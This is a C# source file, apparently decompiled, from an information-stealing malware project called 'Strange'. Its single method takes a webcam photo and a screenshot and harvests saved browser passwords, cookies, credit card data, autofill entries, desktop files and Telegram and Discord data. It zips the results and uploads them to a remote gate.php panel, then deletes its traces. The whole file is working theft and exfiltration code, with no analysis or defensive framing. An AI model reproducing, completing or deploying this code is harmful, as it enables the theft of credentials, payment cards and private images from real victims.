using System;
using System.Collections.Generic;
using System.IO;
using govno.Features;
using Strange.Additions;
using Strange.Features;
using Strange.Main_Features;
using Strange.Modules;
using Strange.String;

namespace Strange
{
	internal static class Collect
	{
		public static void CollectAndSend()
		{
			string text = Environment.GetEnvironmentVariable("temp") + "\\" + Hwid.Getid();
			string text2 = text + "\\Directory";
			string text3 = text2 + "\\Browsers Data";
			Directory.CreateDirectory(text2);
			Directory.CreateDirectory(text3);
			WebCam.GetWebCamPicture(text2 + "\\CamPicture.png");
			Screenshot.CaptureToFile(Path.Combine(text2, "DesktopScreenshot.jpg"));
			string text4 = "";
			List<PassData> passwords = SavedPass.GetPasswords();
			foreach (PassData passData in passwords)
			{
				text4 += passData.ToString();
			}
			File.WriteAllText(text2 + "\\Passwords.txt", text4);
			text4 = "";
			List<CookieData> cookies = Cookies.GetCookies();
			foreach (CookieData cookieData in cookies)
			{
				text4 += cookieData.ToString();
			}
			File.WriteAllText(text3 + "\\Cookies.txt", text4);
			text4 = "";
			List<CardData> cc = Cards.GetCC();
			foreach (CardData cardData in cc)
			{
				text4 += cardData.ToString();
			}
			File.WriteAllText(text3 + "\\CC.txt", text4);
			text4 = "";
			List<FormData> forms = Forms.GetForms();
			foreach (FormData formData in forms)
			{
				text4 += formData.ToString();
			}
			File.WriteAllText(text3 + "\\Autofill.txt", text4);
			text4 = "";
			Desktop.DesktopCopy(text2);
			Telegram.GetTelegram(text2);
			Discord.GetDiscord(text2);
			string text5 = text + "\\" + Hwid.Getid() + ".zip";
			Packer.Zip(text2, text5);
			Send.File(string.Format(Setting.url + string.Format("/gate.php?hwid={0}&os={1}&cookie={2}&pswd={3}&form={4}&telegram={5}&discord={6}&version={7}", new object[]
			{
				Hwid.Getid(),
				Win.GetWin(),
				cookies.Count,
				passwords.Count,
				forms.Count,
				new DirectoryInfo(text2 + "\\Telegram").GetFiles().Length.ToString(),
				new DirectoryInfo(text2 + "\\Discord").GetFiles().Length.ToString(),
				Setting.version.ToString()
			}), new object[0]), text5);
			Miscellaneous.Delete(text, text + "\\temp.exe");
		}
	}
}
